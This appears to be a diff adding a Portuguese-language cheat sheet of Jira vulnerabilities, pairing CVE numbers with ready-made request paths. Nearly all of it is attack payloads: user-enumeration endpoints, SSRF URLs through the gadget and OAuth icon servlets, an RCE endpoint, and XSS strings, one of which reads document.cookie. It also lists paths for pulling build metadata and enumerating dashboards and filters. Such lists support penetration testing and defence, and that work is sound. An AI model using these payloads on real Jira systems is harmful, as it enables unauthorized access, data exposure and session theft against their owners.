@@ -1,0 +1,33 @@
+=== Vulnerabilidades mais comuns no Jira ===
+
+CVE-2019-8449 Enumeração de usuários: /rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true 
+>>==============================<<
+CVE-2019-8451 SSRF: /plugins/servlet/gadgets/makeRequest?url=https://victimhost:1337@example.com
+>>==============================<<
+CVE-2019–11581: RCE: /secure/ContactAdministrators!default.jspa
+>>==============================<<
+CVE-2018-20824 XSS: /plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
+>>==============================<<
+CVE-2020-14181 Enumeração de usuários: /ViewUserHover.jspa?username=Admin
+>>==============================<<
+CVE-2017-9506 SSRF: /plugins/servlet/oauth/users/icon-uri?consumerUri=http:/example.com
+>>==============================<<
+CVE-2019-3403 Divulgação de informações: rest/rest/api/2/user/picker
+>>==============================<<
+CVE-2019-8442 diretório META-INF: /s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
+>>==============================<<
+CVE-2019-3402 XSS: /secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search
+ConfigurePortalPages.jspa
+>>==============================<<
+CVE-2018-20824 XSS: /plugins/servlet/Wallboard/?dashboardId=10100&dashboardId=10101&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=none&random=true
+
+=== Dashboards e Filtros Populares ===
+
+Dashboards: /rest/api/2/dashboard?maxResults=100
+>>==============================<<
+Popular Filters: /secure/ManageFilters.jspa?filter=popular&filterView=popular
+
+=== XSS ===
+
+XSS: /pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm
+>>==============================<<
